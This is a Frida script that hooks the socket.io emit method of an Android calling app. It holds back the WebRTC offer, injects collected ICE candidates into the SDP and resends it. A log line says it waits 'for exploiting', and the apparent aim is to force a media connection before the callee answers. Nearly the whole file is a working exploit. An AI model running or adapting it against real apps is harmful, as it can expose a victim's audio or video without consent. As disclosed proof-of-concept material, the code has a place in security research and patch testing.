var Color = {
    RESET: "\x1b[39;49;00m", Black: "0;01", Blue: "4;01", Cyan: "6;01", Gray: "7;11", Green: "2;01", Purple: "5;01", Red: "1;01", Yellow: "3;01",
    Light: {
        Black: "0;11", Blue: "4;11", Cyan: "6;11", Gray: "7;01", Green: "2;11", Purple: "5;11", Red: "1;11", Yellow: "3;11"
    }
};

var LOG = function (input, kwargs) {
    kwargs = kwargs || {};
    var logLevel = kwargs['l'] || 'log', colorPrefix = '\x1b[3', colorSuffix = 'm';
    if (typeof input === 'object')
        input = JSON.stringify(input, null, kwargs['i'] ? 2 : null);
    if (kwargs['c'])
        input = colorPrefix + kwargs['c'] + colorSuffix + input + Color.RESET;
    console[logLevel](input);
};

var printBacktrace = function () {
    Java.perform(function() {
        var android_util_Log = Java.use('android.util.Log'), java_lang_Exception = Java.use('java.lang.Exception');
        // getting stacktrace by throwing an exception
        LOG(android_util_Log.getStackTraceString(java_lang_Exception.$new()), { c: Color.Gray });
    });
};

Java.perform(function () {
    var socket = Java.use('io.socket.client.Socket');

    var dcand = [];
    var acand = [];
    var vcand = [];

    var offer;
    var socket_instance;
    var candidates_count = 0;

    LOG("\n[*] Start call and wait for exploiting!", { c: Color.Cyan });

    socket.emit.overload('java.lang.String', '[Ljava.lang.Object;').implementation = function(x, y){
        console.log("Socket ===> x: ", x, typeof(x))
        if (x == "offer") {
            // console.log("Offer ===> y[0]: ", y[0]);
            offer = JSON.parse(y[0]);
            return socket.emit.overload('java.lang.String', '[Ljava.lang.Object;').call(this, "anything", []);
        }
        if (x == "candidate") {
            // console.log("candidate: ", y[0]);
            var cand = JSON.parse(y[0]);
            if (candidates_count < 12) {
                if (cand.sdpMid == "audio") {
                    acand.push(cand.sdp);
                }
                else {
                    vcand.push(cand.sdp);
                }
                candidates_count+=1;
            }
            if (candidates_count == 12) {
                var sdpoffer = offer.sdp
                // console.log("offer sdp before: \n", offer.sdp);
                var index_1 = sdpoffer.indexOf("a=ice-ufrag");
                var d1_1 = sdpoffer.substring(0, index_1);
                var d1_2 = sdpoffer.substring(index_1 + "a=ice-ufrag".length, sdpoffer.length);
                var index_2 = d1_2.indexOf("a=ice-ufrag");
                var d2_1 = d1_2.substring(0, index_2);
                var d2_2 = d1_2.substring(index_2 + "a=ice-ufrag".length, d1_2.length);

                sdpoffer = d1_1 + "a=" + acand.join("\r\na=") + "\r\na=ice-ufrag" + d2_1 + "a=" + vcand.join("\r\na=") + "\r\na=ice-ufrag" + d2_2;

                offer.sdp = sdpoffer;

                var obj_class = Java.use("org.json.JSONObject");
                var edit_offer = obj_class.$new(JSON.stringify(offer));
                console.log("editted offer + ice candidates obj: ", edit_offer);

                socket.emit.overload('java.lang.String', '[Ljava.lang.Object;').call(this, "offer", [edit_offer]);

            }
        }
        return socket.emit.overload('java.lang.String', '[Ljava.lang.Object;').call(this, x, y);
    }

});